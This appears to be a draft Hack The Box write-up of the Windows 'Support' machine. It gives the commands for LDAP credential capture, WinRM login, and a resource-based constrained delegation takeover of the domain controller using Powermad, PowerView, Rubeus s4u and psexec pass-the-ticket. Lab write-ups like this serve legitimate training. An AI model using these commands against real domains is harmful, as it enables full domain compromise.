---
title: "Support Walkthrough(HTB)"
date: 2025-03-13
draft: true 
description: "Support is an Easy difficulty Windows machine that features an SMB share that allows anonymous authentication....."
tags: ["Easy", "Windows", "HTB", "Hacking", "Active Directory", "Walkthrough"]
series: ["Hack The Box"]
series_order: 6
---
## Reconnaissance #Windows #ActiveDirectory 
- Got multiple ports open
- ![[Pasted image 20241221142512.png]]
- As always we got LDAP, Netbios, SMB etc ports open
## Enumeration
- Done SMB enumeration `smbclient -L support.htb`
- ![[Pasted image 20241221143207.png]]
- We got a new directory called support-tools
- It seems we got guest login for smb
```
netexec smb support.htb -u sundeity -p ""
```
- We have access for two shares as guest
```
netexec smb support.htb -u sundeity -p "" --shares
```
- ![[Pasted image 20241221143552.png]]
- We got some tools inside the directory
- ![[Pasted image 20241221143832.png]]
- First let me get all the zips and then we can enumerate
- Got nothing from those files so enumerated ldap
```
nmap -n -sV --script "ldap* and not brute" -p 389 support.htb
```
- ![[Pasted image 20241221145020.png]]
- Then enumerated for users using netexec from smb
- Narrowed down the users to a list
```
cat users.txt | grep "SidTypeUser" | cut -d '\' -f 2 | cut -d '(' -f 1 >> users-smb.txt
```
- ![[Pasted image 20241221145402.png]]
- Stored the users in a file.
- Remember the file UsersInfo.exe.zip we have downloaded from SMB.
- On running it with wine we can see that it authenticate to ldap for retrieving the user we requested
- ![[Pasted image 20241221210746.png]]
- If we capture the traffic in wireshark we can get the password.
- ![[Pasted image 20241221210900.png]]
- As we can see it authenticating as user ldap with password
- Getting data for Bloodhound
- ![[Pasted image 20241221211206.png]]
- If we search the results of ldapsearch , particularly in info field which by the way looks like a password.
## Exploitation
```
ldapsearch -H ldap://support.htb -D 'ldap@support.htb' -w '<password' -b "DC=support,DC=htb" | grep "info"
```
- ![[Pasted image 20241221212252.png]]
- We got this password from the user `support@support.htb`
- User support is member of three groups
- ![[Pasted image 20241221213052.png]]
- `crackmapexec` confirms the password for support user
```
crackmapexec winrm support.htb -u users-smb.txt -p <password>
```
- ![[Pasted image 20241221213417.png]]
- Now login with evil-winrm by the user Support and with their password
```
evil-winrm -u support -p '<password>' -i support.htb 
```
- Get the user flag
- ![[Pasted image 20241221213908.png]]
## Privilege Escalation
- If we see, user Support in a group called `Shared Support Accounts@Support.htb` . That group have Generic all permissions over Domain controller Itself.
- ![[Pasted image 20241222182550.png]]
- This privilege allows the trustee to manipulate the target object however they wish.
- We can abuse this by the help instructions in Bloodhound for this Privilege
- Here I am going to create a Fake computer under my control and Act as DC to get kerberos ticket
- **Tools Required**
	- PowersView.ps1
	- Powermad.ps1
	- Rubeus.exe(Pre build from [SharpCollection](https://github.com/Flangvik/SharpCollection/tree/master/NetFramework_4.5_x64))
- **Step 1:**
	- Upload all the tools to target system, here to Support user's PC
	- `cd C:\\programdata`
	- `upload  PowersView.ps1`
	- `upload Powermad.ps1`
	- `upload Rubeus.exe`
	- ![[Pasted image 20241222185340.png]]
- **Step 2:**
	- Invoking all the scripts
```
. .\PowerView.ps1
```

```
. .\Powermad.ps1
```
- **Step 3-Creating a Fake Computer**
```
New-MachineAccount -MachineAccount <Computername> -Password $(ConvertTo-SecureString '<Password>' -AsPlainText -Force)
```
- We need SID of the computer that we created so we assign that value to a variable
```
$fakesid = Get-DomainComputer <Computername> | select -expand objectsid
```
- **Step 4-Configuring**
	- Now I’ll configure the DC to trust my fake computer to make authorization decisions on it’s behalf. These commands will create an ACL with the fake computer’s SID and assign that to the DC
```
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($fakesid))"
```

```
$SDBytes = New-Object byte[] ($SD.BinaryLength)
```

```
$SD.GetBinaryForm($SDBytes, 0)
```

```
Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```
- ![[Pasted image 20241222185607.png]]
- **Step 5-Auth as the Computer**
```
.\Rubeus.exe hash /password:<Password> /user:<ComputerName> /domain:support.htb
```
- Now copy the `rc4_hmac` hash  from the output
- ![[Pasted image 20241222185715.png]]

- **Step 6-Get the Kerberos Ticket**

```
.\Rubeus.exe s4u /user:<Computername>$ /rc4:<Hash> /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt
```
- Now ticket will be captured
- ![[Pasted image 20241222185806.png]]
- Copy the ticket for Administrator and put in a file `ticket.kirbi.b64`
- Remove all the whitespaces and unwanted line I have done this in vim using this command `:%s/\s\+//g`
- Now decode the base64 into a different file
```
base64 -d tick.kirbi.b64 > ticket.kirbi
```
- For linux systems have to convert the form `kirbi` to `ccahe` to pass the ticket
- Using `ticketConverter.py` finish this job
```
sudo /home/n_emperor/.local/share/pipx/venvs/netexec/bin/ticketConverter.py ticket.kirbi ticket.ccache
```
- ![[Pasted image 20241222190321.png]]
- Now **Pass the ticket for a shell**
```
KRB5CCNAME=ticket.ccache psexec.py support.htb/administrator@dc.support.htb -k -no-pass
```
- ![[Pasted image 20241222190446.png]]
- Root flag has been secured
- ![[Pasted image 20241222190524.png]]
